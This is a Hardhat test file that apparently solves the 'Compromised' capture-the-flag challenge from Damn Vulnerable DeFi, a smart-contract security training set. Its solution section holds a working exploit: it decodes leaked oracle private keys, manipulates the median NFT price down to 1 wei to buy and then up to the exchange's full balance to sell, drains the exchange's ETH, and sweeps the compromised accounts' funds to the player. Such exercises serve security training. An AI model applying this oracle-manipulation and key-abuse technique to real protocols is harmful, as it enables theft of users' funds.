const { expect } = require('chai');
const { ethers } = require('hardhat');
const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');

describe('Compromised challenge', function () {
    let deployer, player;
    let oracle, exchange, nftToken;

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    const EXCHANGE_INITIAL_ETH_BALANCE = 999n * 10n ** 18n;
    const INITIAL_NFT_PRICE = 999n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
    const TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();
        
        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            setBalance(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
            expect(await ethers.provider.getBalance(sources[i])).to.equal(TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        
        // Player starts with limited balance
        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
        
        // Deploy the oracle and setup the trusted sources with initial prices
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);
        oracle = await (await ethers.getContractFactory('TrustfulOracle', deployer)).attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ['DVNFT', 'DVNFT', 'DVNFT'],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = await (await ethers.getContractFactory('Exchange', deployer)).deploy(
            oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        nftToken = await (await ethers.getContractFactory('DamnValuableNFT', deployer)).attach(await exchange.token());
        expect(await nftToken.owner()).to.eq(ethers.constants.AddressZero); // ownership renounced
        expect(await nftToken.rolesOf(exchange.address)).to.eq(await nftToken.MINTER_ROLE());
    });

    it('Execution', async function () {


    /** CODE YOUR EXPLOIT HERE
     * 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
     * 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
     * 0xe92401A4d3af5E446d93D11EEc806b1462b39D15
     *
     * 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
     * 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
     * 0x81A5D6E50C214044bE44cA0CB057fe119097850c
     *
     * Having those two sources under control, we can perform an attack manipulating the price.
     * 1. Connect the TrustfulOracle contract to the pwned accounts.
     * 2. Set with postPrice("NFVT", 0) the new price
     * 3. id = buyOne NFT.
     * 4. Set new postPrice("NFVT", newPrice) newPrice == exchange.balance
     * 5. sellOne(id)
     **/

    const source1 = new ethers.Wallet(
      "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
      ethers.provider
    );
    const source2 = new ethers.Wallet(
      "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48",
      ethers.provider
    );

    let medianPrice, source1Price, source2Price, newPrice;
    async function printPrices(oracle) {
      medianPrice = ethers.utils.formatEther(
        await oracle.getMedianPrice("DVNFT")
      );
      source1Price = ethers.utils.formatEther(
        await oracle.getPriceBySource("DVNFT", source1.address)
      );
      source2Price = ethers.utils.formatEther(
        await oracle.getPriceBySource("DVNFT", source2.address)
      );

      console.log(
        `Median: ${medianPrice}. Source1: ${source1Price}, Source2: ${source2Price}`
      );
    }

    async function changePrice(oracle, newPrice) {
      await oracle.connect(source1).postPrice("DVNFT", newPrice);
      await oracle.connect(source2).postPrice("DVNFT", newPrice);
    }

    await printPrices(oracle);

    newPrice = 1;
    await changePrice(oracle, newPrice);
    await printPrices(oracle);

    let tx = await exchange.connect(player).buyOne({ value: newPrice });
    let rc = await tx.wait();
    const event = rc.events.find((event) => event.event === "TokenBought");
    const [, tokenId] = event.args;

    newPrice = await ethers.provider.getBalance(exchange.address);

    await changePrice(oracle, newPrice);
    await printPrices(oracle);

    await nftToken
      .connect(player)
      .approve(exchange.address, tokenId);
    await exchange.connect(player).sellOne(tokenId);

    await changePrice(oracle, INITIAL_NFT_PRICE);

    async function drainAcc(source) {
        sourceBalance = await ethers.provider.getBalance(source.address);

        gasEstimation = await ethers.provider.estimateGas({
          to: player.address,
          value: sourceBalance,
        });
    
        // Add a small amount of gas in case estimation failed.
        gasEstimation = gasEstimation.add(112);
        costEstimation = (await ethers.provider.getFeeData()).maxFeePerGas.mul(gasEstimation);
        // errorMargin = 1.000000000001;
    
        console.log(`
                    Gas estimation ${gasEstimation}.
                    Cost estimation: ${costEstimation}.
                    Balance: ${sourceBalance}
                    Balance - cost: ${sourceBalance - costEstimation}
        `);
        try {
          await source.sendTransaction({
            to: player.address,
            value: sourceBalance.sub(costEstimation),
            gasLimit: gasEstimation.toString(),
          });
        } catch (err) {
          console.log(err);
        }
    }

    await drainAcc(source1);
    await drainAcc(source2);
    
  });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(exchange.address)
        ).to.be.eq(0);
        
        // Player's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(player.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Player must not own any NFT
        expect(
            await nftToken.balanceOf(player.address)
        ).to.be.eq(0);

        // NFT price shouldn't have changed
        expect(
            await oracle.getMedianPrice('DVNFT')
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
